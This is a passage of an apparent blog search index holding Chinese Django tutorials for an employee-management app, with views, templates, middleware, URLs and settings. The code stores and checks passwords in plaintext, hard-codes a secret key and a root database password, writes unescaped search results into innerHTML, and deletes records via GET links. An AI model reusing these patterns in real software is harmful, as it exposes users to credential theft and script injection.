class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;m&quot; checked=&quot;checked&quot;/&gt; 女 &lt;input type=&quot;radio&quot; class=&quot;inputgri&quot; name=&quot;sex&quot; value=&quot;f&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; 验证码: &lt;img id=&quot;img1&quot; src=&quot;&#123;% url &#x27;emsapp:getCaptcha&#x27; %&#125;&quot; width=&quot;70px&quot;/&gt; &lt;a href=&quot;javascript:void(0)&quot; id=&quot;a1&quot;&gt;换一张&lt;/a&gt; &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;captcha&quot; id=&quot;captcha&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;span id=&quot;s1&quot;&gt;&lt;/span&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;button&quot; id=&quot;submit&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt;&#123;% endblock %&#125; updateEmp.html12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#123;% extends &quot;emsapp/emplist.html&quot; %&#125;&#123;% load static %&#125;&#123;% block content %&#125; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; update Emp info: &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;emsapp:updareEmp_logic&quot; %&#125;?id=&#123;&#123; staff.id &#125;&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; id: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &#123;&#123; staff.id &#125;&#125; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; name: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; value=&quot;&#123;&#123; staff.name &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; salary: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;salary&quot; value=&quot;&#123;&#123; staff.salary &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; age: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;age&quot; value=&quot;&#123;&#123; staff.age &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; head_pic: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;img src=&quot;&#123;% static staff.head_pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;head_pic&quot;&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Confirm&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt;&#123;% endblock %&#125; addEmp.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&#123;% extends &quot;emsapp/emplist.html&quot; %&#125;&#123;% block content %&#125; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; add Emp info: &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;emsapp:addEmp_logic&quot; %&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; name: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; salary: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;salary&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; age: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;age&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; head_pic: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;file&quot; class=&quot;inputgri&quot; name=&quot;head_pic&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Confirm&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt;&#123;% endblock %&#125; 中间件myMiddleware123456789101112131415161718192021222324252627282930313233# _*_coding:UTF-8 _*_from django.shortcuts import renderfrom django.utils.deprecation import MiddlewareMixinclass MyMiddleware(MiddlewareMixin): # 自定义的中间件 def __init__(self, get_response): # 初始化 super().__init__(get_response) print(&quot;中间件已经初始化完毕&quot;) # view处理请求前执行 def process_request(self, request): # 某一个view if &#x27;login&#x27; not in request.path: is_login = request.session.get(&#x27;login&#x27;) if is_login: pass elif &quot;regist&quot; in request.path: pass elif &quot;getCaptcha&quot; in request.path: pass else: return render(request, &#x27;emsapp/login.html&#x27;) # 在process_request之后View之前执行 def process_view(self, request, view_func, view_args, view_kwargs): print(&quot;view:&quot;, request, view_func, view_args, view_kwargs) # view执行之后，响应之前执行 def process_response(self, request, response): print(&quot;response:&quot;, request, response) return response # 必须返回response # 如果View中抛出了异常 def process_exception(self, request, ex): # View中出现异常时执行 print(&quot;exception:&quot;, request, ex) urls.py1234567891011121314151617181920# _*_coding:UTF-8 _*_from django.urls import pathfrom emsapp import viewsapp_name = &#x27;emsapp&#x27;urlpatterns = [ path(&#x27;login/&#x27;,views.login, name=&#x27;login&#x27; ), path(&#x27;login1/&#x27;,views.login1, name=&#x27;login1&#x27; ), path(&#x27;regist/&#x27;,views.regist, name=&#x27;regist&#x27; ), path(&#x27;addemp/&#x27;,views.addEmp, name=&#x27;addEmp&#x27; ), path(&#x27;updateemp/&#x27;,views.updateEmp, name=&#x27;updateEmp&#x27; ), path(&#x27;delete/&#x27;,views.delete, name=&#x27;delete&#x27; ), path(&#x27;emplist_logic/&#x27;,views.emplist_logic,name=&#x27;emplist_logic&#x27;), path(&#x27;regist_logic/&#x27;,views.regist_logic,name=&#x27;regist_logic&#x27;), path(&#x27;addEmp_logic/&#x27;,views.addEmp_logic,name=&#x27;addEmp_logic&#x27;), path(&#x27;updateEmp_logic/&#x27;,views.updareEmp_logic,name=&#x27;updareEmp_logic&#x27;), path(&#x27;getCaptcha/&#x27;,views.getCaptcha,name=&#x27;getCaptcha&#x27;), path(&#x27;query/&#x27;,views.query,name=&#x27;query&#x27;),] settings.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131&quot;&quot;&quot;Django settings for ems project.Generated by &#x27;django-admin startproject&#x27; using Django 2.0.6.For more information on this file, seehttps://docs.djangoproject.com/en/2.0/topics/settings/For the full list of settings and their values, seehttps://docs.djangoproject.com/en/2.0/ref/settings/&quot;&quot;&quot;import os# Build paths inside the project like this: os.path.join(BASE_DIR, ...)BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))# Quick-start development settings - unsuitable for production# See https://docs.djangoproject.com/en/2.0/howto/deployment/checklist/# SECURITY WARNING: keep the secret key used in production secret!SECRET_KEY = &#x27;f+x_dfajz+9lvvmzvz-6q$f!i9+*&amp;6kxjc+@ql9ubm$2ub7au9&#x27;# SECURITY WARNING: don&#x27;t run with debug turned on in production!DEBUG = TrueALLOWED_HOSTS = []# Application definitionINSTALLED_APPS = [ &#x27;django.contrib.admin&#x27;, &#x27;django.contrib.auth&#x27;, &#x27;django.contrib.contenttypes&#x27;, &#x27;django.contrib.sessions&#x27;, &#x27;django.contrib.messages&#x27;, &#x27;django.contrib.staticfiles&#x27;, &#x27;emsapp&#x27;,]MIDDLEWARE = [ &#x27;django.middleware.security.SecurityMiddleware&#x27;, &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;, &#x27;django.middleware.common.CommonMiddleware&#x27;, &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;, &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;, &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;, &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;, #激活中间件 &#x27;emsapp.myMiddleware.MyMiddleware&#x27;,]ROOT_URLCONF = &#x27;ems.urls&#x27;TEMPLATES = [ &#123; &#x27;BACKEND&#x27;: &#x27;django.template.backends.django.DjangoTemplates&#x27;, &#x27;DIRS&#x27;: [os.path.join(BASE_DIR, &#x27;templates&#x27;)] , &#x27;APP_DIRS&#x27;: True, &#x27;OPTIONS&#x27;: &#123; &#x27;context_processors&#x27;: [ &#x27;django.template.context_processors.debug&#x27;, &#x27;django.template.context_processors.request&#x27;, &#x27;django.contrib.auth.context_processors.auth&#x27;, &#x27;django.contrib.messages.context_processors.messages&#x27;, ], &#125;, &#125;,]WSGI_APPLICATION = &#x27;ems.wsgi.application&#x27;# Database# https://docs.djangoproject.com/en/2.0/ref/settings/#databasesDATABASES = &#123; &#x27;default&#x27;: &#123; &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, &#x27;NAME&#x27;: &#x27;test&#x27;, &#x27;USER&#x27;: &#x27;root&#x27;, &#x27;HOST&#x27;: &#x27;localhost&#x27;, &#x27;PORT&#x27;: &#x27;3306&#x27;, &#x27;PASSWORD&#x27;: &#x27;123456&#x27; &#125;&#125;# Password validation# https://docs.djangoproject.com/en/2.0/ref/settings/#auth-password-validatorsAUTH_PASSWORD_VALIDATORS = [ &#123; &#x27;NAME&#x27;: &#x27;django.contrib.auth.password_validation.UserAttributeSimilarityValidator&#x27;, &#125;, &#123; &#x27;NAME&#x27;: &#x27;django.contrib.auth.password_validation.MinimumLengthValidator&#x27;, &#125;, &#123; &#x27;NAME&#x27;: &#x27;django.contrib.auth.password_validation.CommonPasswordValidator&#x27;, &#125;, &#123; &#x27;NAME&#x27;: &#x27;django.contrib.auth.password_validation.NumericPasswordValidator&#x27;, &#125;,]# Internationalization# https://docs.djangoproject.com/en/2.0/topics/i18n/LANGUAGE_CODE = &#x27;en-us&#x27;TIME_ZONE = &#x27;UTC&#x27;USE_I18N = TrueUSE_L10N = TrueUSE_TZ = True# Static files (CSS, JavaScript, Images)# https://docs.djangoproject.com/en/2.0/howto/static-files/STATIC_URL = &#x27;/static/&#x27;# STATIC_ROOT=os.path.join(BASE_DIR,&#x27;static&#x27;) #用于nginx收集静态资源时使用SESSION_EXPIRE_AT_BROWSER_CLOSE = TrueMEDIA_ROOT = os.path.join(BASE_DIR,&#x27;media&#x27;)STATICFILES_DIRS = [os.path.join(BASE_DIR,&#x27;static&#x27;),MEDIA_ROOT]","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://example.com/tags/Django/"}]},{"title":"Django-员工操作","slug":"Django-员工操作-1","date":"2020-08-28T00:05:03.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/08/28/Django-员工操作-1/","permalink":"http://example.com/2020/08/28/Django-%E5%91%98%E5%B7%A5%E6%93%8D%E4%BD%9C-1/","excerpt":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作,中间件,上传头像,验证码 ,分页显示 新增模糊查询,使用 Jquery-Ajax 新增登陆时只更新部分内容,使用Ajax控制","text":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作,中间件,上传头像,验证码 ,分页显示 新增模糊查询,使用 Jquery-Ajax 新增登陆时只更新部分内容,使用Ajax控制 view视图123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126# 注册页面def regist(request): return render(request, &quot;work/regist.html&quot;)# 添加员工页面def addEmp(request): return render(request, &quot;work/addEmp.html&quot;)# 修改员工页面def updateEmp(request): # 填写获取的该员工信息 id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) return render(request, &quot;work/updateEmp.html&quot;, &#123;&quot;staff&quot;: staff&#125;)# 登陆逻辑def login_logic(request): if request.method == &quot;GET&quot;: username = request.GET.get(&quot;name&quot;) userpwd = request.GET.get(&quot;pwd&quot;) else: username = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) res = User.objects.filter(username=username, userpwd=userpwd) if res: request.session[&#x27;is_login&#x27;] = True # 登陆正确设置及session会话 return HttpResponse(&#x27;ok&#x27;) return HttpResponse(&#x27;用户名或密码错误&#x27;)# # 模糊查询def query(request): staff = request.GET.get(&quot;query&quot;) res = Staff.objects.filter(name__icontains=staff) print(res) def mydefault(u): if isinstance(u,Staff): return &#123;&#x27;name&#x27;:u.name,&#x27;salary&#x27;:float(u.salary),&#x27;age&#x27;:u.age&#125; return JsonResponse(&#123;&#x27;staff&#x27;:list(res)&#125;,safe=False,json_dumps_params=&#123;&#x27;default&#x27;:mydefault&#125;)# 随机码def getCaptacha(request): image = ImageCaptcha() code = random.sample(string.ascii_lowercase + string.ascii_uppercase + string.digits, 4) random_code = &#x27;&#x27;.join(code) request.session[&#x27;code&#x27;] = random_code data = image.generate(random_code) return HttpResponse(data, &quot;image/png&quot;)# 注册逻辑def regist_logic(request): username = request.POST.get(&quot;username&quot;) name = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) sex = request.POST.get(&quot;sex&quot;) # 获取输入的验证码 captcha = request.POST.get(&#x27;captcha&#x27;) code = request.session.get(&#x27;code&#x27;) if code.lower() == captcha.lower(): res = User.objects.filter(username=username) # 获取数据库是否拥有用户名 if res: return HttpResponse(&quot;用户已存在&quot;) with transaction.atomic(): User.objects.create(username=username, name=name, userpwd=userpwd, sex=sex) return redirect(&quot;work:login&quot;) else: return HttpResponse(&#x27;注册失败&#x27;)# 添加员工逻辑def addEmp_logic(request): # # 判断是否存在session,不存在强制返回登陆界面 # res = request.session.get(&#x27;is_login&#x27;) # if res: # return redirect(&quot;work:emplist_logic&quot;) # 存在session,返回员工页面 name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) # 获取上传的头像 pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(pic.name)[1] # 获取后缀 head_pic = str(uuid.uuid4()) + ext # 拼接后缀名 pic.name = head_pic with transaction.atomic(): Staff.objects.create(name=name, salary=salary, age=age, pic=pic) return redirect(&quot;work:emplist_logic&quot;)# 修改数据逻辑def updateEmp_logic(request): # 根据修改页面的该员工的id id = request.GET.get(&#x27;id&#x27;) print(id) staff = Staff.objects.get(pk=id) # 获取到提交的修改数据 name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) # 修改图片 pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(pic.name)[1] # 获取后缀 head_pic = str(uuid.uuid4()) + ext # 拼接后缀名 pic.name = head_pic # 进行员工的信息修改 with transaction.atomic(): staff.name = name staff.salary = salary staff.age = age staff.pic = pic staff.save() return redirect(&quot;work:emplist&quot;)# 删除员工def delete_logic(request): with transaction.atomic(): id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.filter(pk=id) staff.delete() return redirect(&#x27;work:emplist&#x27;)# 主页逻辑def emplist_logic(request): # 分页需要导包Paginator num = request.GET.get(&#x27;num&#x27;, 1) paginator = Paginator(Staff.objects.all(), per_page=3) # 每页显示3条数据 page = paginator.page(num) # 构建页面对象 return render(request, &#x27;work/emplist.html&#x27;, &#123;&quot;page&quot;: page&#125;) emplistHtml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178&#123;% load static %&#125;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;emplist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;&#123;% static &#x27;work/css/style.css&#x27; %&#125;&quot;/&gt; &lt;script src=&quot;&#123;% static &#x27;work/js/jquery-1.11.1.min.js&#x27; %&#125;&quot;&gt;&lt;/script&gt; &lt;script&gt; function f() &#123; var table = document.getElementById(&#x27;t1&#x27;); var query = document.getElementById(&#x27;s1&#x27;); $.ajax(&#123; type: &#x27;GET&#x27;, url: &#x27;&#123;% url &#x27;work:query&#x27; %&#125;&#x27;, data: &quot;query=&quot; + query.value, success: function (c) &#123; c = c[&#x27;staff&#x27;]; console.log(c); var str = &#x27;&lt;tr&gt;&lt;td&gt;姓名&lt;/td&gt;&lt;td&gt;薪水&lt;/td&gt;&lt;td&gt;年龄&lt;/td&gt;&lt;/tr&gt;&#x27;; for (var i = 0; i &lt; c.length;i++) &#123; str += &quot;&lt;tr&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;name&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;salary&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;age&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;/tr&gt;&quot;; &#125; table.innerHTML = str &#125; &#125;) &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br/&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; Welcome! &lt;/h1&gt; &lt;div&gt; &lt;input type=&quot;text&quot; id=&quot;s1&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;搜索&quot; onclick=&quot;f()&quot;&gt; &lt;/div&gt; &lt;table class=&quot;table&quot; id=&quot;t1&quot;&gt; &lt;tr class=&quot;table_header&quot;&gt; &lt;td&gt; ID &lt;/td&gt; &lt;td&gt; Name &lt;/td&gt; &lt;td&gt; Salary &lt;/td&gt; &lt;td&gt; Age &lt;/td&gt; &lt;td&gt; head_pic &lt;/td&gt; &lt;td&gt; Operation &lt;/td&gt; &lt;/tr&gt; &#123;% for i in page.object_list %&#125; &#123;% if forloop.counter|divisibleby:2 %&#125; &lt;tr class=&quot;row1&quot; style=&quot;background-color: #ffffff&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% else %&#125; &lt;tr class=&quot;row2&quot; style=&quot;background-color: #eeeeee&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/table&gt; &#123;% if page.has_previous %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.previous_page_number &#125;&#125;&quot;&gt; 上一页&lt;/a&gt; &#123;% endif %&#125; &#123;% for foo in page.paginator.page_range %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; foo &#125;&#125;&quot;&gt; &#123;% if foo == page.number %&#125; &lt;span class=&quot;b&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;span class=&quot;a&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;/a&gt; &#123;% endfor %&#125; &#123;% if page.has_next %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.next_page_number &#125;&#125;&quot;&gt; 下一页&lt;/a&gt; &#123;% endif %&#125; &#123;% if not page.paginator.num_pages == page.number %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.paginator.num_pages &#125;&#125;&quot;&gt;尾页&lt;/a&gt; &#123;% endif %&#125; &lt;form action=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;&quot; method=&quot;get&quot;&gt; 输入页号&lt;input type=&quot;text&quot; name=&quot;num&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;跳转&quot;&gt; &lt;p&gt; &lt;input type=&quot;button&quot; class=&quot;button&quot; value=&quot;Add Employee&quot; onclick=&quot;location=&#x27;&#123;% url &quot;work:addemp&quot; %&#125;&#x27;&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; login.html1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495&#123;% load static %&#125;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;login&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot;/&gt; &lt;script&gt; function f1() &#123; var name = document.getElementById(&quot;name&quot;).value; var pwd = document.getElementById(&quot;pwd&quot;).value; var s1 = document.getElementById(&quot;s1&quot;); var xml = new XMLHttpRequest(); xml.open(&#x27;POST&#x27;, &#x27;&#123;% url &#x27;work:login_logic&#x27; %&#125;&#x27;, true); xml.setRequestHeader(&quot;Content-type&quot;, &#x27;application/x-www-form-urlencoded&#x27;); xml.send(&#x27;name=&#x27; + name + &#x27;&amp;pwd=&#x27; + pwd + &#x27;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&#x27;); &#123;#回调函数#&#125; xml.onreadystatechange = function () &#123; if (xml.readyState == 4 &amp;&amp; xml.status == 200) &#123; var text = xml.responseText; console.log(text); if (text == &#x27;ok&#x27;) &#123; &#123;#s1.innerHTML = text;#&#125; location.href =&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;&quot; &#125; else &#123; s1.innerHTML = text; document.getElementById(&quot;pwd&quot;).value = &#x27;&#x27;; &#125; &#125; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br/&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; login &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:login_logic&quot; %&#125;&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; username: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; id=&quot;name&quot;/&gt; &lt;span id=&quot;s1&quot;&gt;&lt;/span&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; password: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; name=&quot;pwd&quot; id=&quot;pwd&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;button&quot; onclick=&quot;f1()&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://example.com/tags/Django/"}]},{"title":"Django-员工操作","slug":"Django-员工操作","date":"2020-08-25T02:33:37.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/08/25/Django-员工操作/","permalink":"http://example.com/2020/08/25/Django-%E5%91%98%E5%B7%A5%E6%93%8D%E4%BD%9C/","excerpt":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作 新增中间件,上传头像,验证码 ,分页显示","text":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作 新增中间件,上传头像,验证码 ,分页显示 Django员工操作Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作 新增中间件,上传头像,验证码 ,分页显示views123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131import os, uuidfrom django.db import transactionfrom django.http import HttpResponsefrom 